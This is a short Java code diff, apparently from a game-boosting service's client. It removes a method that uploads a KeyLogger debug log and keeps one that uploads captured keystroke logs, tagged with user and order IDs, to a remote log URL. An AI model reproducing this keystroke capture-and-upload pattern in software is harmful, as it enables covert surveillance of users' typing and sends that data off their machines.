@@ -33,18 +33,6 @@ public class Utils {
     private static boolean foundBadWord = false;
     public Boolean scriptAlert = false;
 
-    public void uploadDebugLog(User user){
-        JsonObject jsonObject = new JsonObject();
-        jsonObject.addProperty("booster_id", user.getId());
-        JsonArray debugLogFile = new JsonArray();
-        for (String message : KeyLogger.debugLog) {
-            debugLogFile.add(message + "\n");
-        }
-        jsonObject.add("debugLogFile", debugLogFile);
-        sendJson(Globals.logUploadURL, jsonObject);
-        KeyLogger.debugLog.clear();
-    }
-
     public void uploadLog(User user, Order order) {
         if(!KeyLogger.logUploaded && KeyLogger.log.size() > 5) {
             if(checkForBadWords(KeyLogger.log)) {
@@ -61,6 +49,7 @@ public class Utils {
             jsonObject.addProperty("fileName", createKey(user, order));
 
             System.out.println(jsonObject);
+            System.out.println("kaki");
             sendJson(Globals.logUploadURL, jsonObject);
             KeyLogger.log.clear();
         }
